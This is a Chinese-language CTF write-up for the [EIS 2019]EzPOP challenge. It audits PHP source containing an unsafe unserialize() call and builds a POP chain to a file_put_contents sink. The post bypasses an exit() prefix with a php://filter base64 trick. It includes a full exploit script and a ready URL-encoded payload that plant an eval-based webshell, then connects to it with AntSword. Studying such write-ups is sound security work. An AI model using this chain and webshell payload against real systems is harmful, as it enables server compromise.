---
title: '[EIS 2019]EzPOP'
date: 2024-09-06 19:07:10
tags: 
      - 题解
      - 反序列化
categories: 刷题笔记
---

### [EIS 2019]EzPOP

我们查看源码

```
<?php
error_reporting(0);

class A {

    protected $store;

    protected $key;

    protected $expire;

    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this->key = $key;
        $this->store = $store;
        $this->expire = $expire;
    }

    public function cleanContents(array $contents) {
        $cachedProperties = array_flip([
            'path', 'dirname', 'basename', 'extension', 'filename',
            'size', 'mimetype', 'visibility', 'timestamp', 'type',
        ]);

        foreach ($contents as $path => $object) {
            if (is_array($object)) {
                $contents[$path] = array_intersect_key($object, $cachedProperties);
            }
        }

        return $contents;
    }

    public function getForStorage() {
        $cleaned = $this->cleanContents($this->cache);

        return json_encode([$cleaned, $this->complete]);
    }

    public function save() {
        $contents = $this->getForStorage();

        $this->store->set($this->key, $contents, $this->expire);
    }

    public function __destruct() {
        if (!$this->autosave) {
            $this->save();
        }
    }
}

class B {

    protected function getExpireTime($expire): int {
        return (int) $expire;
    }

    public function getCacheKey(string $name): string {
        return $this->options['prefix'] . $name;
    }

    protected function serialize($data): string {
        if (is_numeric($data)) {
            return (string) $data;
        }

        $serialize = $this->options['serialize'];

        return $serialize($data);
    }

    public function set($name, $value, $expire = null): bool{
        $this->writeTimes++;

        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }

        $expire = $this->getExpireTime($expire);
        $filename = $this->getCacheKey($name);

        $dir = dirname($filename);

        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        $data = $this->serialize($value);

        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
        $result = file_put_contents($filename, $data);

        if ($result) {
            return true;
        }

        return false;
    }

}

if (isset($_GET['src']))
{
    highlight_file(__FILE__);
}

$dir = "uploads/";

if (!is_dir($dir))
{
    mkdir($dir);
}
unserialize($_GET["data"]);
```

进行代码审计，我们发现A类的调用关系为__destruct->save()->getForStorage->cleanContents
然后再进行到save()中的`$this->store->set($this->key, $contents, $this->expire);`

<!--more-->

然后调用B类中的set方法

```
  public function set($name, $value, $expire = null): bool{
        $this->writeTimes++;

        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }

        $expire = $this->getExpireTime($expire);
        $filename = $this->getCacheKey($name);

        $dir = dirname($filename);

        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        $data = $this->serialize($value);

        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
        $result = file_put_contents($filename, $data);

        if ($result) {
            return true;
        }

        return false;
    }
```

set中前面调用的getxxx都是对变量数据类型进行处理的没什么好看的，然后是到了serialize方法

```
protected function serialize($data): string {
    if (is_numeric($data)) {
        return (string) $data;
    }

    $serialize = $this->options['serialize'];

    return $serialize($data);
}
```

这里有个`$serialize($data)`函数动态调用

再到`$data = gzcompress($data, 3)`,这里由于if条件不满足可以直接跳过

再到这个很明显的漏洞地方

```
$data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
$result = file_put_contents($filename, $data);
```

**我们可以利用file_put_contents写入php文件,直接getshell**

这里data前面拼接了`<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n"`

绕过exit可以参考[p牛的这篇文章](https://www.leavesongs.com/PENETRATION/php-filter-magic.html),

$filename=php://filter/convert.base64-encode/resource=xx.php就可以破坏掉exit(),

```
sprintf('%012d', $expire)
```

`$expire`可控

还让我们可以填base64_decode,填充为4的倍数,让php代码被正确解码出来

```
$filename和$data都可控
```

它们在set中的处理过程:

```
$data = $this->serialize($value)


$filename = $this->getCacheKey($name)

    
$value和$name由set($name, $value, $expire = null)定义

由$this->store->set($this->key, $contents, $this->expire)传入
在A类中key直接是可控的,
$contents=json_encode([$cleaned, $this->complete])
其中$cleaned = $this->cleanContents($this->cache);
```

所以`$filename`的值由A类中`$key`决定

`$data`由A类中的`$cache`和`$complete`决定

(注意函数传入变量的类型要求

构造exp

```
<?php

class A {

    protected $store;
    protected $key;
    protected $expire;
    public $cache = array(1234=>"UEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiSjNnblhTazdQejQ9");  
        /*<?php eval($_POST['x']);?>的二次base64编码
        二次编码的原因是json_enocde会将cache字符串中的/和_进行转义
        解密也有两次,一次$serialize,一次php://fileter   */
    public $complete = "";
    
    public function __construct($store='', $key = 'flysystem', $expire = null) {
        $this->key = 'php://filter/convert.base64-decode/resource=x.php';
        $this->store = new B();
        $this->expire = $expire;
    }
}

class B {

    public $options =array('serialize'=>'base64_decode','expire'=>12346578910111) ;

}

$a = new A();
echo urlencode(serialize($a)).PHP_EOL;
/*
?data=O%3A1%3A%22A%22%3A5%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A7%3A%22options%22%3Ba%3A2%3A%7Bs%3A9%3A%22serialize%22%3Bs%3A13%3A%22base64_decode%22%3Bs%3A6%3A%22expire%22%3Bi%3A12346578910111%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A49%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Dx.php%22%3Bs%3A9%3A%22%00%2A%00expire%22%3BN%3Bs%3A5%3A%22cache%22%3Ba%3A1%3A%7Bi%3A1234%3Bs%3A48%3A%22UEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiSjNnblhTazdQejQ9%22%3B%7Ds%3A8%3A%22complete%22%3Bs%3A0%3A%22%22%3B%7D
*/

```

然后访问x.php，连接蚁剑
